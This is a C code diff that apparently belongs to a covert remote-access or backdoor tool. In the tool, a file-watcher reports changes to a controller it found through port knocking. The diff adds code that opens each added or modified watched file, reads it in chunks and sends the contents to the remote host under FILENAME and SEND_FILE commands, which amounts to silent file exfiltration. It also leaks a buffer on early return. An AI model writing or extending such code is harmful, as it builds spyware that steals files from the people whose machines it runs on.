@@ -165,7 +165,7 @@ static void free_watches(watch_table_t * watch_table) {
 
 static void run_workflows(const struct session_info * session_info, const change_list_t * changes) {
     if (changes == NULL || changes->count == 0) return;
-    char * message_buffer = malloc(1024);
+    char * message_buffer = malloc(MESSAGE_BUFFER_LENGTH);
     if (message_buffer == NULL) return;
 
     for (int i = 0; i < changes->count; i++) {
@@ -173,14 +173,55 @@ static void run_workflows(const struct session_info * session_info, const change
         const char * type_str = c->type == CHANGE_ADDED   ? "ADDED"
                               : c->type == CHANGE_REMOVED ? "REMOVED"
                               : "MODIFIED";
+        
         log_message("[WATCH] %-10s %s", type_str, c->path);
 
-        const int bytes_written = snprintf(message_buffer, 1024, "[WATCH] %-10s %s", type_str, c->path);
+        const int bytes_written = snprintf(message_buffer, MESSAGE_BUFFER_LENGTH, "[WATCH] %-10s %s", type_str, c->path);
         message_buffer[bytes_written] = '\0';
 
-        send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, c->path);
+        send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, message_buffer);
         usleep(500000);
         send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, RESPONSE);
+
+        if (c->type != CHANGE_REMOVED) {
+            FILE * file = fopen(c->path, "rb");
+            if (file == NULL) {
+                fprintf(stderr, "Failed to open file: %s\n", c->path);
+                return;
+            }
+
+            char * file_buffer = malloc(MESSAGE_BUFFER_LENGTH);
+            if (file_buffer == NULL) {
+                fprintf(stderr, "Failed to allocate file buffer\n");
+                fclose(file);
+                return;
+            }
+
+            // Send over the filename and the FILENAME command
+            send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, c->path);
+
+            usleep(500000);
+            send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, FILENAME);
+
+            size_t chunk_count = 0;
+            size_t chunk_bytes;
+            while ((chunk_bytes = fread(file_buffer, 1, MESSAGE_BUFFER_LENGTH - 1, file)) > 0) {
+                file_buffer[chunk_bytes] = '\0';
+                send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, file_buffer);
+                chunk_count++;
+                printf("Sent chunk %zu (%zu bytes)\n", chunk_count, chunk_bytes);
+                fflush(stdout);
+            }
+
+            printf("File transfer complete. Sent %zu chunks\n", chunk_count);
+            fflush(stdout);
+
+            fclose(file);
+            free(file_buffer);
+
+            usleep(500000);
+            send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, SEND_FILE);
+        }
     }
 
     free(message_buffer);
